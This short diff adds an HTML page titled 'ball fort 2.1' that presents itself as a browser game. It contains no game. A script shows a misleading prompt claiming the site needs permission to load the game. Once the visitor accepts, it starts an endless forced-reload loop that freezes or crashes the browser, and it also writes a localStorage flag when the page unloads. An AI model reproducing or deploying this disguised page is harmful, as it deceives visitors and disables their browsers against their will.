@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<title>ball fort 2.1</title>
+
+
+<p id="demo"></p>
+
+
+<script>
+onbeforeunload = function(){localStorage.x=1};
+
+
+if(confirm("This site need permision to load the game.")){
+  setTimeout(function(){
+    while(1)location.reload(1)
+  }, 1000)
+}
+</script>
+
+
+</body>
+</html>
